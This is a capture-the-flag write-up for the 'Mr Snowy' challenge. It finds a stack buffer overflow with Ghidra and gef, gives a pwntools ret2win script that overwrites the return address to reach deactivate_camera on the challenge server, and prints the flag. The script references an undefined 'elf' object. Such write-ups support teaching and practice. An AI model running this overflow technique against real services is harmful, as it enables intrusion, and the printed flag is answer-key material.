# Mr Snowy (Day 1)

We are presented with a file called **mr_snowy**. I first ran *checksec* to see its security protections 

![checksec](https://user-images.githubusercontent.com/71312079/151013607-b92d96e7-fb52-46d1-92e3-4d13276bf334.png)

Hmm... Seems like although there is no stack canary present, the stack is non-executable meaning that I can't load shellcode and execute it on the stack.

The next step would be to execute the file, where I was greeted with the following prompt:

![mrsnowy1](https://user-images.githubusercontent.com/71312079/151013653-2d0ad278-18c1-417f-8ba5-8d5bcda62690.png)

Choosing *2* would simply exit the program and selecting *1* led me to this next screen:

![mrsnowy2](https://user-images.githubusercontent.com/71312079/151013664-0b22bccc-1c73-4240-9ce6-56bdcdcd0351.png)

Similarly to the previous screen, selecting *2* would also exit the program but I received the following prompt after selecting *1* would still lead to a **Mission Failed** as I somehow needed a password?

Still a little confused, I then opened the file in Ghidra and noted that there was a function called **deactivate_camera** which would read the **flag.txt**.

![deactivate_camera](https://user-images.githubusercontent.com/71312079/151013626-4c80d9e4-fdc3-4298-8285-55fcf4d4e6f3.png)

Bingo! Seems like we will have to navigate to the address of **deactivate_camera** in order to obtain the flag. Looking at the **Investigate** function, we also see that the variable *local_48* appears to be vulnearble to a buffer overflow attack

![investigate](https://user-images.githubusercontent.com/71312079/151013644-8d0b5c63-1b68-4627-89d1-bda0ae4d2136.png)


To calculate the offset for the buffer overflow, I will use **gef**, which provides additional functionality to **gdb**. These are the steps I performed:
1. Created a pattern of *100 bytes* (I know the offset should be > 64 bytes since the buffer was 64 bytes long )
2. Ran the file and inputted the pattern that gef generated for me at the *investigate* function
3. Searched for the pattern in *$rsp* after the segmentation occured
4. Noted that the offset is **72** 

![gef_offset](https://user-images.githubusercontent.com/71312079/151013636-40d13112-7cc1-4c8f-9984-60a62e22b85e.png)

I then created a python script to craft the payload to send to the remote server, allowing me to obtain the flag.

```python
from pwn import *
p = remote('159.65.52.165', 32386)
# offset obtained from gef
offset = 72

for i in range(16):
    print(p.recvuntil("\n"))

p.sendline('1')
for i in range(5):
    print(p.recvuntil("\n"))

addr = elf.symbols['deactivate_camera']
print('addr', addr)
payload = [
        b'A'*72,
        p64(addr)
        ]
payload = b"".join(payload)
p.sendline(payload)

p.interactive()
```

Flag: `HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}`

## Thoughts:
* This was my first ever pwning challenge and I really enjoyed it as it was quite beginner friendly.
* For most of the code involving *pwntools*, I relied on a [walkthrough](https://www.youtube.com/watch?v=WNh3tFysYXY&t=831s&ab_channel=JohnHammond) by John Hammond that provides a generic template for tackling pwning challenges as they tend to follow a similar pattern.